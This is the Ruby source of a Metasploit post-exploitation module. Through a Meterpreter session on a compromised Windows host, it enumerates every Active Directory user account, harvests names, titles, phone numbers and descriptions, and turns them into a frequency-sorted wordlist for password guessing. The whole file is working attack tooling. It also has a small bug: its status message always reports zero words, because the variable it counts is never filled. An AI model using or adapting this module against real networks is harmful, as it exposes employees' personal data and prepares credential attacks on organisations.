##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  SEARCH_FILTER = '(&(objectClass=organizationalPerson)(objectClass=user)(objectClass=person)(!(objectClass=computer)))'
  DEFAULT_FIELDS = [
    'sn',
    'givenName',
    'state',
    'postalCode',
    'physicalDeliveryOfficeName',
    'telephoneNumber',
    'mobile',
    'facsimileTelephoneNumber',
    'displayName',
    'title',
    'department',
    'company',
    'streetAddress',
    'sAMAccountName',
    'userAccountControl',
    'comment',
    'description'
  ]

  def initialize(info={})
    super( update_info( info,
      'Name'         => 'Windows Gather Words from Active Directory',
      'Description'  => %q{
        This module will enumerate all user accounts in the default Active Domain (AD) directory
        and use these as words to seed a wordlist.In cases (like description) where spaces may
        occur, some extra processing is done to generate multiple words in addition to one long
        one (up to 24 characters). Results are dumped into /tmp
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['Thomas Ring'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options([
      OptString.new('FIELDS', [true, 'Fields to retrieve (ie, sn, givenName, displayName, description, comment)', DEFAULT_FIELDS.join(',')]),
    ], self.class)
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/,'').split(',')

    q = nil

    begin
      q = query(SEARCH_FILTER, datastore['MAX_SEARCH'], fields)
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      # Can't bind or in a network w/ limited accounts
      print_error(e.message)
      return
    end

    return if q.nil? || q[:results].empty?

    @words_dict = {}
    q[:results].each do |result|
      result.each do |field|
        search_words(field)
      end # result.each
    end # q.each

    # build array of words to output sorted on frequency
    output = []
    ordered_dict = @words_dict.sort_by { |k,v| v }.reverse
    ordered_dict.collect! { |k, v| k }

    wordlist_file = Rex::Quickfile.new("wordlist")
    wordlist_file.write(ordered_dict.join("\n") + "\n")
    print_status("Seeded the password database with #{output.length} words into #{wordlist_file.path}...")
    wordlist_file.close
  end

  def search_words(field)
    return if field.blank?
    return if field =~ /^\s*$/ || field.length < 3

    field.gsub!(/[\(\)\"]/, '') # clear up common punctuation in descriptions
    field.downcase!             # clear up case

    words = field.split(/\s+|=|\/|,|\+/)
    return if words.empty?

    words.each do |word|
      next if word.length < 3 || word.length > 24
      if @words_dict[word]
        @words_dict[word] += 1
      else
        @words_dict[word] = 1
      end
    end
  end
end

